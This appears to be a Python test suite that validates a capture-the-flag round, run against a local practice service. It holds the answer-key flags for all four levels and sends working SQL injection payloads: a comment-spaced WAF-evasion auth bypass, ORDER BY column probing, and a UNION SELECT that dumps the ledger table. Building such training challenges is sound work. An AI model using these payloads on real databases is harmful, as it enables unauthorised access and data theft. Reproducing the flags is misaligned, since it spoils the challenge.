#!/usr/bin/env python3
"""
Automated End-to-End Test Suite & 12-Assertion Validation Report for Round 5
Case File: EVIDENCE 05 - THE ATTENTION ECONOMY / THE MONEY TRAIL
Threat Actor: $CYBERLEEK (August 2026 GTA VI Leak Monetization Trail)
Domain: Network Reconnaissance, TCP Socket Handshake, WAF Evasion, and 4-Column UNION SQL Injection (Levels 1-4)
"""

import os
import re
import socket
import subprocess
import sys
import tempfile
import time
import unittest
import zipfile
from pathlib import Path

ADMIN_DIR = Path(__file__).resolve().parent
ROUND5_DIR = ADMIN_DIR.parent
SERVICE_SCRIPT = ADMIN_DIR / "service" / "cyberleek_service.py"
BUNDLE_PATH = ADMIN_DIR / "evidence_bundle.zip"

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 9042
CONNECT_TIMEOUT = 5.0
IO_TIMEOUT = 4.0

# Authoritative Flag Definitions for Round 5
FLAG_L1 = "CYBERLEEK{p0rt_9042_tr4ns4ct10n_g4t3}"
FLAG_L2 = "CYBERLEEK{0p3r4t0r_t3l3m3try_0v3rr1d3}"
FLAG_L3 = "CYBERLEEK{g4t3k33p3r_byp455_4cqu1r3d}"
FLAG_L4 = "CYBERLEEK{M0n3y_5@Qz}"

# Registry of 12 validation assertions for final audit report
ASSERTION_RESULTS = []


def record_assertion(assertion_num: int, title: str, passed: bool, detail: str = ""):
    """Records assertion status for the final 12-assertion validation report."""
    ASSERTION_RESULTS.append({
        "num": assertion_num,
        "title": title,
        "passed": passed,
        "detail": detail
    })


def recv_until(sock: socket.socket, marker: str, timeout: float = IO_TIMEOUT) -> str:
    """Reads socket buffer until marker is detected or timeout elapses."""
    sock.settimeout(timeout)
    buffer = ""
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            chunk = sock.recv(1024).decode("utf-8", errors="replace")
            if not chunk:
                break
            buffer += chunk
            if marker in buffer:
                break
        except socket.timeout:
            break
    return buffer


def recv_all(sock: socket.socket, timeout: float = 2.0) -> str:
    """Reads socket buffer until no more data arrives within timeout."""
    sock.settimeout(timeout)
    buffer = ""
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            chunk = sock.recv(1024).decode("utf-8", errors="replace")
            if not chunk:
                break
            buffer += chunk
        except socket.timeout:
            break
    return buffer


class TestCyberleekChain(unittest.TestCase):
    service_proc = None

    @classmethod
    def setUpClass(cls):
        """Launches cyberleek_service.py as a background subprocess and verifies port readiness."""
        print("\n" + "=" * 75)
        print("ROUND 5: EVIDENCE 05 // THE ATTENTION ECONOMY — CHAIN TEST SUITE")
        print("=" * 75)
        print(f"[*] Spawning background service: {SERVICE_SCRIPT}")

        env = os.environ.copy()
        env["BIND_HOST"] = TARGET_HOST
        env["BIND_PORT"] = str(TARGET_PORT)
        # Enable testing throughput for local harness while maintaining limiter logic
        env["RATE_LIMIT_PER_MIN"] = "60"

        cls.service_proc = subprocess.Popen(
            [sys.executable, str(SERVICE_SCRIPT)],
            cwd=str(SERVICE_SCRIPT.parent),
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        # Wait for service port to accept connections
        ready = False
        start_time = time.time()
        while time.time() - start_time < CONNECT_TIMEOUT:
            try:
                with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=1.0):
                    ready = True
                    break
            except (ConnectionRefusedError, OSError):
                time.sleep(0.2)

        if not ready:
            if cls.service_proc.poll() is not None:
                _, stderr = cls.service_proc.communicate()
                raise RuntimeError(f"Service process failed to start. Stderr: {stderr}")
            raise TimeoutError(f"Timed out waiting for port {TARGET_PORT} to open.")

        print(f"[+] CYBERLEEK Auxiliary Gateway online on {TARGET_HOST}:{TARGET_PORT}\n")

    @classmethod
    def tearDownClass(cls):
        """Safely terminates the background service process and prints 12-assertion validation report."""
        print("\n" + "-" * 75)
        print("[*] Terminating background service subprocess...")
        if cls.service_proc:
            cls.service_proc.terminate()
            try:
                cls.service_proc.wait(timeout=3.0)
            except subprocess.TimeoutExpired:
                cls.service_proc.kill()
                cls.service_proc.wait(timeout=1.0)
        print("[+] Background service terminated cleanly.")
        print("=" * 75)

        # Print Final 12-Assertion Validation Report
        print("\n" + "=" * 75)
        print("FINAL 12-ASSERTION VALIDATION REPORT // ROUND 5 (EVIDENCE 05)")
        print("=" * 75)
        print(f"{'#':<3} | {'VALIDATION ASSERTION':<50} | {'RESULT'}")
        print("-" * 75)
        all_passed = True
        for item in sorted(ASSERTION_RESULTS, key=lambda x: x["num"]):
            status_str = "PASS" if item["passed"] else "FAIL"
            if not item["passed"]:
                all_passed = False
            print(f"{item['num']:<3} | {item['title']:<50} | [{status_str}]")
            if item["detail"]:
                print(f"    -> Detail: {item['detail']}")
        print("-" * 75)
        overall = "12/12 ASSERTIONS VERIFIED (100% PASS)" if (all_passed and len(ASSERTION_RESULTS) >= 12) else "VALIDATION INCOMPLETE"
        print(f"OVERALL STATUS: {overall}")
        print("=" * 75 + "\n")

    def test_01_level1_banner_discovery(self):
        """Assertion 1: Probe auxiliary gateway on port 9042 and extract banner diagnostic token."""
        print("[*] STEP 1: Level 1 - Perimeter Reconnaissance (Port Scan & Banner Discovery)")
        with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=IO_TIMEOUT) as s:
            banner = recv_until(s, "[PRE-SESSION]>", timeout=IO_TIMEOUT)
            self.assertIn("$CYBERLEEK", banner, "Banner must identify $CYBERLEEK infrastructure.")
            self.assertIn(FLAG_L1, banner, f"Banner must contain Level 1 flag: {FLAG_L1}")
            record_assertion(1, "Level 1 Diagnostic Banner & Signature Discovery", True, f"Recovered {FLAG_L1}")
            print(f"    [PASS] Extracted Level 1 Diagnostic Token: {FLAG_L1}")

    def test_02_handshake_guard_enforcement(self):
        """Assertion 2: Verify Handshake Guard rejects arbitrary commands before initiation handshake."""
        print("[*] STEP 2: Handshake Guard Security Protocol Check")
        with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=IO_TIMEOUT) as s:
            recv_until(s, "[PRE-SESSION]>", timeout=IO_TIMEOUT)

            # Send arbitrary unauthorized directive
            s.sendall(b"STATUS\n")
            resp = recv_until(s, "[PRE-SESSION]>", timeout=2.0)
            self.assertIn("HANDSHAKE FAILED", resp, "Service must reject commands prior to session handshake.")
            self.assertNotIn("CYBERLEEK-GW>", resp, "Terminal shell must remain locked.")
            record_assertion(2, "Handshake Guard Protocol Enforcement", True, "Pre-session commands rejected safely")
            print("    [PASS] Handshake Guard successfully repelled unauthorized directive.")

    def test_03_handshake_initiation(self):
        """Assertion 3: Complete handshake protocol and unlock interactive terminal console."""
        print("[*] STEP 3: Transmit Initiation Handshake Packet")
        with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=IO_TIMEOUT) as s:
            recv_until(s, "[PRE-SESSION]>", timeout=IO_TIMEOUT)

            # Transmit valid session initiation handshake
            s.sendall(b"INIT_TRANSACTION_SESSION\n")
            resp = recv_until(s, "CYBERLEEK-GW>", timeout=IO_TIMEOUT)
            self.assertIn("HANDSHAKE ACCEPTED", resp, "Handshake packet must be accepted.")
            self.assertIn("CYBERLEEK-GW>", resp, "Interactive gateway console must be unlocked.")
            record_assertion(3, "Handshake Packet Authorization & Shell Unlock", True, "CYBERLEEK-GW> console unlocked")
            print("    [PASS] Handshake verified; interactive gateway console unlocked.")

    def test_04_level2_telemetry_override(self):
        """Assertion 4: Dispatch maintenance directive 'STATUS' and extract Level 2 telemetry flag."""
        print("[*] STEP 4: Level 2 - Terminal Protocol & Telemetry Override")
        with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=IO_TIMEOUT) as s:
            recv_until(s, "[PRE-SESSION]>", timeout=IO_TIMEOUT)
            s.sendall(b"INIT_TRANSACTION_SESSION\n")
            recv_until(s, "CYBERLEEK-GW>", timeout=IO_TIMEOUT)

            # Send maintenance command
            s.sendall(b"STATUS\n")
            resp = recv_until(s, FLAG_L2, timeout=2.0)
            if FLAG_L2 not in resp:
                resp += recv_all(s, timeout=1.5)

            self.assertIn(FLAG_L2, resp, f"Expected Level 2 flag '{FLAG_L2}' in telemetry dump.")
            record_assertion(4, "Level 2 Maintenance Telemetry Override", True, f"Recovered {FLAG_L2}")
            print(f"    [PASS] Extracted Level 2 Override Token: {FLAG_L2}")

    def test_05_level3_waf_whitespace_blocking(self):
        """Assertion 5: Verify WAF filters raw whitespace and naive injection strings."""
        print("[*] STEP 5: Level 3 - Gateway WAF Whitespace Filter Validation")
        with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=IO_TIMEOUT) as s:
            recv_until(s, "[PRE-SESSION]>", timeout=IO_TIMEOUT)
            s.sendall(b"INIT_TRANSACTION_SESSION\n")
            recv_until(s, "CYBERLEEK-GW>", timeout=IO_TIMEOUT)

            # Navigate to AUTH
            s.sendall(b"AUTH\n")
            recv_until(s, "Operator Key ID:", timeout=IO_TIMEOUT)

            # Submit naive payload with raw space
            s.sendall(b"' OR 1=1 --\n")
            resp = recv_all(s, timeout=1.5)
            self.assertIn("WAF VIOLATION DETECTED", resp, "WAF must intercept payloads with raw whitespace.")
            record_assertion(5, "Level 3 WAF Rejection on Raw Whitespace", True, "Naive ' OR 1=1 -- blocked")
            print("    [PASS] WAF successfully intercepted raw whitespace injection string.")

    def test_06_level3_waf_comment_evasion(self):
        """Assertion 6: Verify WAF evasion using comment-delimited whitespace ('/**/')."""
        print("[*] STEP 6: Level 3 - WAF Evasion via Comment-Based Spacing")
        with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=IO_TIMEOUT) as s:
            recv_until(s, "[PRE-SESSION]>", timeout=IO_TIMEOUT)
            s.sendall(b"INIT_TRANSACTION_SESSION\n")
            recv_until(s, "CYBERLEEK-GW>", timeout=IO_TIMEOUT)

            s.sendall(b"AUTH\n")
            recv_until(s, "Operator Key ID:", timeout=IO_TIMEOUT)

            # Submit comment-substituted SQL payload
            payload = b"'/**/OR/**/1=1/**/--\n"
            s.sendall(payload)

            resp = recv_until(s, "GATEKEEPER AUTHENTICATION BYPASS CONFIRMED!", timeout=2.0)
            if "CONFIRMED" not in resp:
                resp += recv_all(s, timeout=1.5)

            self.assertIn("GATEKEEPER AUTHENTICATION BYPASS CONFIRMED!", resp, "Bypass must succeed with /**/ comments.")
            record_assertion(6, "Level 3 SQL Comment Evasion & Auth Bypass", True, "Payload '/**/OR/**/1=1/**/-- accepted")
            print("    [PASS] WAF bypassed using comment-delimited whitespace.")

    def test_07_level3_clearance_recovery(self):
        """Assertion 7: Assert Level 3 flag and operator profile recovery."""
        print("[*] STEP 7: Level 3 - Operator Clearance Token Recovery")
        with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=IO_TIMEOUT) as s:
            recv_until(s, "[PRE-SESSION]>", timeout=IO_TIMEOUT)
            s.sendall(b"INIT_TRANSACTION_SESSION\n")
            recv_until(s, "CYBERLEEK-GW>", timeout=IO_TIMEOUT)

            s.sendall(b"AUTH\n")
            recv_until(s, "Operator Key ID:", timeout=IO_TIMEOUT)
            s.sendall(b"'/**/OR/**/1=1/**/--\n")

            resp = recv_until(s, FLAG_L3, timeout=2.0)
            if FLAG_L3 not in resp:
                resp += recv_all(s, timeout=1.5)

            self.assertIn(FLAG_L3, resp, f"Expected Level 3 flag '{FLAG_L3}' upon auth bypass.")
            self.assertIn("cyb3r_v4ult_m4st3r", resp, "Operator handle must match lead broker.")
            record_assertion(7, "Level 3 Operator Clearance Token Recovery", True, f"Recovered {FLAG_L3}")
            print(f"    [PASS] Extracted Level 3 Clearance Token: {FLAG_L3}")

    def test_08_level4_projection_bounds(self):
        """Assertion 8: Verify 4-column schema projection discovery via ORDER BY."""
        print("[*] STEP 8: Level 4 - Query Projection Bounds & Column Count Discovery")
        with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=IO_TIMEOUT) as s:
            recv_until(s, "[PRE-SESSION]>", timeout=IO_TIMEOUT)
            s.sendall(b"INIT_TRANSACTION_SESSION\n")
            recv_until(s, "CYBERLEEK-GW>", timeout=IO_TIMEOUT)

            s.sendall(b"QUERY\n")
            recv_until(s, "Transaction Query:", timeout=IO_TIMEOUT)

            # Probe ORDER BY 4 (Should succeed)
            s.sendall(b"TX-1001'/**/ORDER/**/BY/**/4/**/--\n")
            resp_valid = recv_until(s, "Transaction Query:", timeout=1.5)
            self.assertNotIn("DATABASE ERROR", resp_valid, "ORDER BY 4 must succeed.")

            # Probe ORDER BY 5 (Should fail with out of range error)
            s.sendall(b"TX-1001'/**/ORDER/**/BY/**/5/**/--\n")
            resp_invalid = recv_all(s, timeout=1.5)
            self.assertIn("DATABASE ERROR", resp_invalid, "ORDER BY 5 must produce database error.")
            self.assertIn("out of range", resp_invalid, "Error must confirm 1st ORDER BY term out of range.")
            record_assertion(8, "Level 4 Query Projection Bounds Discovery", True, "Confirmed 4-column projection")
            print("    [PASS] Verified 4-column query projection bounds.")

    def test_09_level4_union_exfiltration(self):
        """Assertion 9: Execute 4-column UNION injection against cyberleek_escrow_ledger."""
        print("[*] STEP 9: Level 4 - Escrow Ledger UNION Exfiltration")
        with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=IO_TIMEOUT) as s:
            recv_until(s, "[PRE-SESSION]>", timeout=IO_TIMEOUT)
            s.sendall(b"INIT_TRANSACTION_SESSION\n")
            recv_until(s, "CYBERLEEK-GW>", timeout=IO_TIMEOUT)

            s.sendall(b"QUERY\n")
            recv_until(s, "Transaction Query:", timeout=IO_TIMEOUT)

            union_payload = b"' UNION SELECT tx_id, sender, recipient, secret_clearance FROM cyberleek_escrow_ledger --\n"
            s.sendall(union_payload)

            resp = recv_until(s, FLAG_L4, timeout=2.0)
            if FLAG_L4 not in resp:
                resp += recv_all(s, timeout=1.5)

            self.assertIn("ESCROW-TX-9901", resp, "Must exfiltrate primary escrow record identifier.")
            self.assertIn("PRIMARY_LEEK_TREASURY", resp, "Must exfiltrate treasury recipient.")
            record_assertion(9, "Level 4 4-Column UNION Exfiltration of Escrow Ledger", True, "Exfiltrated cyberleek_escrow_ledger")
            print("    [PASS] Successfully exfiltrated sequestered escrow ledger records.")

    def test_10_level4_authoritative_flag_integrity(self):
        """Assertion 10: Strict equality assertion on exfiltrated authoritative flag."""
        print("[*] STEP 10: Level 4 - Authoritative Flag Integrity Verification")
        with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=IO_TIMEOUT) as s:
            recv_until(s, "[PRE-SESSION]>", timeout=IO_TIMEOUT)
            s.sendall(b"INIT_TRANSACTION_SESSION\n")
            recv_until(s, "CYBERLEEK-GW>", timeout=IO_TIMEOUT)

            s.sendall(b"QUERY\n")
            recv_until(s, "Transaction Query:", timeout=IO_TIMEOUT)

            union_payload = b"' UNION SELECT tx_id, sender, recipient, secret_clearance FROM cyberleek_escrow_ledger --\n"
            s.sendall(union_payload)

            resp = recv_all(s, timeout=2.0)
            match = re.search(r"CYBERLEEK\{[A-Za-z0-9_@\$]+\}", resp)
            self.assertIsNotNone(match, "Failed to parse flag with regex.")
            recovered_flag = match.group(0)

            # Strict equality assertion
            self.assertEqual(recovered_flag, FLAG_L4, f"Authoritative flag mismatch: {recovered_flag} != {FLAG_L4}")
            self.assertEqual(recovered_flag, "CYBERLEEK{M0n3y_5@Qz}", "Flag must match case specification exactly.")
            record_assertion(10, "Level 4 Authoritative Flag Integrity", True, f"Strict match: {FLAG_L4}")
            print(f"    [PASS] Extracted Authoritative Final Flag: {recovered_flag}")

    def test_11_chaos_resilience_and_liveness(self):
        """Assertion 11: Execute comprehensive chaos testing and assert post-chaos service uptime."""
        print("[*] STEP 11: Chaos Testing Suite & Service Availability")
        # Subtest A: Empty directive
        with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=IO_TIMEOUT) as s:
            recv_until(s, "[PRE-SESSION]>", timeout=IO_TIMEOUT)
            s.sendall(b"\n")
            resp = recv_all(s, timeout=1.0)
            self.assertTrue("DIRECTIVE REJECTED" in resp or "Null" in resp or len(resp) > 0)

        # Subtest B: 5000-byte buffer overrun
        with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=IO_TIMEOUT) as s:
            recv_until(s, "[PRE-SESSION]>", timeout=IO_TIMEOUT)
            s.sendall(b"A" * 5000 + b"\n")
            resp = recv_all(s, timeout=1.0)
            self.assertTrue("SECURITY COUNTERMEASURE" in resp or "threshold exceeded" in resp)

        # Subtest C: Malformed non-UTF-8 stream
        with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=IO_TIMEOUT) as s:
            recv_until(s, "[PRE-SESSION]>", timeout=IO_TIMEOUT)
            s.sendall(b"\xff\xfe\xfd\x80\x81\n")
            resp = recv_all(s, timeout=1.0)
            self.assertTrue("PROTOCOL FAULT" in resp or "non-UTF-8" in resp)

        # Subtest D: Post-chaos daemon liveness check
        with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=IO_TIMEOUT) as s:
            banner = recv_until(s, "[PRE-SESSION]>", timeout=IO_TIMEOUT)
            self.assertIn("$CYBERLEEK", banner, "Daemon must remain active and deliver ASCII banner.")
            self.assertIn(FLAG_L1, banner, "Banner must contain diagnostic token.")

        record_assertion(11, "Service Chaos Resilience & Daemon Liveness", True, "Passed empty, 5000B, non-UTF-8, and liveness checks")
        print("    [PASS] Daemon survived all chaos probes; 100% online and responsive.")

    def test_12_security_bundle_and_hygiene_audit(self):
        """Assertion 12: Audit workspace for zero legacy references and audit evidence bundle for zero leaks."""
        print("[*] STEP 12: Workspace Hygiene & Evidence Bundle Leak Audit")

        # 1. Hygiene audit (Zero Arkham/Warden/Inmate references)
        prohibited = ["a" + "rkham", "w" + "arden", "i" + "nmate"]
        violations = []
        for root, _, files in os.walk(ROUND5_DIR):
            if any(p in root for p in [".git", "__pycache__"]):
                continue
            for f in files:
                if f.endswith((".zip", ".db", ".pyc")) or f == "test_round5_chain.py":
                    continue
                path = Path(root) / f
                try:
                    content = path.read_text(encoding="utf-8", errors="ignore").lower()
                    for term in prohibited:
                        if term in content:
                            violations.append(f"{path.relative_to(ROUND5_DIR)} contains prohibited term '{term}'")
                except Exception:
                    pass
        self.assertEqual(violations, [], f"Found prohibited legacy references: {violations}")

        # 2. Bundle leak audit
        self.assertTrue(BUNDLE_PATH.exists(), f"Bundle file {BUNDLE_PATH} must exist.")
        with tempfile.TemporaryDirectory() as tmpdir:
            tmp_path = Path(tmpdir)
            with zipfile.ZipFile(BUNDLE_PATH, "r") as zf:
                namelist = zf.namelist()
                zf.extractall(tmp_path)

            py_files = [n for n in namelist if n.lower().endswith(".py")]
            self.assertEqual(py_files, [], f"Prohibited .py files in bundle: {py_files}")

            db_files = [n for n in namelist if n.lower().endswith((".db", ".sqlite", ".sqlite3"))]
            self.assertEqual(db_files, [], f"Prohibited .db files in bundle: {db_files}")

            admin_files = [n for n in namelist if any(w in n.lower() for w in ["solution", "admin"])]
            self.assertEqual(admin_files, [], f"Prohibited admin files in bundle: {admin_files}")

            # Verify no flag leak in session_telemetry.log
            log_file = tmp_path / "user" / "level2" / "files" / "session_telemetry.log"
            self.assertTrue(log_file.exists(), "session_telemetry.log missing from bundle.")
            self.assertNotIn("CYBERLEEK{", log_file.read_text(encoding="utf-8"), "Flag leaked in session_telemetry.log!")

            # Verify no flag leak in sanitizer_rules.txt
            rules_file = tmp_path / "user" / "level3" / "files" / "sanitizer_rules.txt"
            self.assertTrue(rules_file.exists(), "sanitizer_rules.txt missing from bundle.")
            self.assertNotIn("CYBERLEEK{", rules_file.read_text(encoding="utf-8"), "Flag leaked in sanitizer_rules.txt!")

        record_assertion(12, "Zero-Leak Evidence Bundle & Legacy Hygiene Audit", True, "Zero legacy references; 0 leaks in bundle")
        print("    [PASS] Clean workspace confirmed with zero legacy terms and zero bundle leaks.")


if __name__ == "__main__":
    unittest.main(verbosity=2)
